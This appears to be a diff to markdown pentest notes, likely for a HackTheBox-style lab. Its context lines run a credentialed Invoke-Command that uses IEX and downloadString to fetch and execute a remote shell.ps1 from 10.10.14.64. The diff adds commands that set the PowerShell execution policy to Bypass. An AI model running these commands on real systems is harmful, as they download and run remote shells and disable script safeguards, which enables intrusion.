@@ -35,3 +35,8 @@ $cred = new-object -typename System.Management.Automation.PSCredential -argument
 Invoke-Command -ScriptBlock { IEX(New-Object Net.WebClient).downloadString('http://10.10.14.64:81/shell.ps1') } -Credential $cred -Computer localhost
 ```
 
+```text
+Set-ExecutionPolicy RemoteSigned -Scope CurrentUser
+Set-ExecutionPolicy -Scope Process -ExecutionPolicy Bypass
+```
+
